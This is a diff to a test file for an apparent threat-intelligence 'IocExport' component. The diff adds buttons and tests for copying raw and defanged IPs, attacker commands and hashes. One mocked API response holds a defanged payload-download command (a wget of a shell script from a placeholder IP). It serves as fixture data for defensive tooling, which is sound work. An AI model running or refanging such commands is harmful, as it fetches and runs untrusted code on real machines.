@@ -17,11 +17,28 @@ describe("IocExport", () => {
 
   it("offers both raw and defanged copies, plus file downloads", () => {
     render(<IocExport endpoint={endpoint} />);
-    expect(screen.getByRole("button", { name: /copy list/i })).toBeInTheDocument();
-    expect(screen.getByRole("button", { name: /copy defanged/i })).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: /copy ips/i })).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: /copy defanged ips/i })).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: /copy commands/i })).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: /copy defanged commands/i })).toBeInTheDocument();
     expect(screen.getByRole("button", { name: /copy sha-256/i })).toBeInTheDocument();
     // Downloads are real links so right-click / save-as behaves normally.
-    expect(screen.getAllByRole("link", { name: /csv/i }).length).toBe(2);
+    // One CSV per section: IPs, commands, hashes.
+    expect(screen.getAllByRole("link", { name: /csv/i }).length).toBe(3);
+  });
+
+  it("asks the API for commands, and for the defanged variant of them", async () => {
+    const writeText = withClipboard();
+    global.fetch = vi.fn(() =>
+      Promise.resolve({ ok: true, text: () => Promise.resolve("# header\nwget hxxp://1.2.3[.]4/b.sh\n") })
+    );
+    render(<IocExport endpoint={endpoint} />);
+    fireEvent.click(screen.getByRole("button", { name: /copy defanged commands/i }));
+    await waitFor(() => expect(writeText).toHaveBeenCalled());
+    const requested = String(global.fetch.mock.calls[0][0]);
+    expect(requested).toContain("type=commands");
+    expect(requested).toContain("defang=1");
+    expect(requested).toContain("format=txt");
   });
 
   it("asks the API for the defanged variant rather than mangling text locally", async () => {
@@ -30,7 +47,7 @@ describe("IocExport", () => {
       Promise.resolve({ ok: true, text: () => Promise.resolve("# header\n1.2.3[.]4\n") })
     );
     render(<IocExport endpoint={endpoint} />);
-    fireEvent.click(screen.getByRole("button", { name: /copy defanged/i }));
+    fireEvent.click(screen.getByRole("button", { name: /copy defanged ips/i }));
     await waitFor(() => expect(global.fetch).toHaveBeenCalled());
     const url = String(global.fetch.mock.calls[0][0]);
     expect(url).toContain("defang=1");
@@ -47,7 +64,7 @@ describe("IocExport", () => {
       })
     );
     render(<IocExport endpoint={endpoint} />);
-    fireEvent.click(screen.getByRole("button", { name: /copy list/i }));
+    fireEvent.click(screen.getByRole("button", { name: /copy ips/i }));
     await waitFor(() => expect(writeText).toHaveBeenCalledWith("1.2.3.4\n5.6.7.8"));
   });
 
@@ -63,7 +80,7 @@ describe("IocExport", () => {
     Object.defineProperty(navigator, "clipboard", { value: undefined, configurable: true });
     global.fetch = vi.fn(() => Promise.resolve({ ok: true, text: () => Promise.resolve("1.2.3.4") }));
     render(<IocExport endpoint={endpoint} />);
-    fireEvent.click(screen.getByRole("button", { name: /copy list/i }));
+    fireEvent.click(screen.getByRole("button", { name: /copy ips/i }));
     expect(await screen.findByRole("alert")).toHaveTextContent(/download links still work/i);
   });
 });
